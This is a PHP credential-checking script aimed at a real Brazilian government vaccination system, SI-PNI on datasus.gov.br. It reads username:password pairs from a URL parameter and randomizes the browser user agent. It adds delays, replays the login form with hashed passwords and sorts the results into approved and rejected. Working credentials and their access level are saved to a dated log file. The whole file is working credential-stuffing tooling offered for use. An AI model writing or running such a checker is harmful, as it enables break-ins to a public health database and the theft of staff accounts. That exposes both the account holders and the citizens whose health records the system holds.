<?php
error_reporting(0);
date_default_timezone_set("America/Sao_Paulo");

$chromeMajor = rand(138, 139);
$build = rand(0, 200);
$patch = rand(0, 200);
$useragent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$chromeMajor}.0.{$build}.{$patch} Safari/537.36";


function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$lista = $_GET['lista'];
$separar = explode(":", $lista);
$user = $separar[0];
$senha = $separar[1];

$hash = hash('sha512', $senha);

$reprovado = '[❌️] Reprovada | '.$user.':'.$senha.'';

$erro = '[⚠️] Erro | '.$user.':'.$senha.' | Erro, retorno nao encontrado!';

$aprovado = '[✅️] Aprovada | '.$user.':'.$senha.'';


 $cookieFile = 'cookiess.txt';

if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

    sleep(2);
    usleep(250000);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Referer: https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf',
    'Connection: keep-alive',
    'User-Agent: '.$useragent.''

]);

$getView = curl_exec($ch);

$view = puxar($getView, 'name="javax.faces.ViewState" id="javax.faces.ViewState" value="','" autocomplete="off" />');

    sleep(2);
    usleep(500000);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/xml, text/xml, */*; q=0.01',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Faces-Request: partial/ajax',
    'Referer: https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf',
    'X-Requested-With: XMLHttpRequest',
    'User-Agent: '.$useragent.''
]);
$post = [
    'javax.faces.partial.ajax' => 'true',
    'javax.faces.source' => 'j_idt23:j_idt35',
    'javax.faces.partial.execute' => '@all',
    'j_idt23:j_idt35' => 'j_idt23:j_idt35',
    'j_idt23' => 'j_idt23',
    'javax.faces.ViewState' => $view,
    'j_idt23:usuario' => $user,
    'j_idt23:senha' => $hash
];

$postData = http_build_query($post);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
$login = curl_exec($ch);

    sleep(3);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Referer: https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf',
    'Accept-Language: pt-BR,pt;q=0.9',
    'User-Agent: '.$useragent.''
]);

$getRetorn = curl_exec($ch);
curl_close($ch);
$nivel = puxar($getRetorn, 'Nível:',' </label>' );

$data = date("d-m-Y");

if (strpos($getRetorn, 'Usuário ou senha incorreto!') !== false) {
  echo $reprovado . " Usuário ou senha incorreto!";
}elseif (strpos($getRetorn, 'http://pni.datasus.gov.br/sipni/tabelas.update') !== false) {
    file_put_contents(
    "si-pni-web" . $data . ".txt",
    date("d/m/Y H:i:s") . " | " . $user . " | " . $senha . " | " . $nivel . " | @NoumenoSystem" . PHP_EOL,
    FILE_APPEND
);
    echo $aprovado . " | NIVEL : {$nivel} \n@NoumenoSystem";
}else {
    echo $erro;
}



?>